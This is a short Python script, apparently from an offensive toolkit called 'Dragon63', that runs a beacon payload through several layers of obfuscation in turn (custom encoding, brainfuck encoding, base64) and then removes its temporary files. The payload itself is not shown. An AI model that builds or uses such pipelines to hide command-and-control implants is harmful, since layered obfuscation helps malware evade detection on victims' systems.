import subprocess
import os

def run_script(script, input_file, output_file):
    subprocess.run(["python3", script, input_file, output_file], check=True)

def step1():
    run_script("core/beacon/src/encoder.py", "build/beacon/beacon.py", "core/beacon/process/encoded1.txt")

def step2():
    run_script("core/beacon/src/builder.py", "core/beacon/process/encoded1.txt", "core/beacon/process/encoded1.py")

def step3():
    run_script("core/beacon/src/brainfuck_enc.py", "core/beacon/process/encoded1.py", "core/beacon/process/encoded2.txt")

def step4():
    run_script("core/beacon/src/brainfuck_payload_builder.py", "core/beacon/process/encoded2.txt", "core/beacon/process/encoded2.py")

def step5():
    run_script("core/beacon/src/base64_obf.py", "core/beacon/process/encoded2.py", "build/beacon/beacon.py")

def cleanup_temp_files():
    files_to_delete = [
        "core/beacon/process/encoded1.txt",
        "core/beacon/process/encoded2.txt",
        "core/beacon/process/encoded1.py",
        "core/beacon/process/encoded2.py"
    ]
    for filename in files_to_delete:
        if os.path.exists(filename):
            os.remove(filename)

def print_result_path():
    file_path = os.path.abspath("build/beacon/beacon.py")
    print(f"[+] Dragon63 obfuscated payload has been saved in: {file_path}")

def main():
    step1()
    step2()
    step3()
    step4()
    step5()
    print_result_path()
    cleanup_temp_files()

if __name__ == "__main__":
    main()

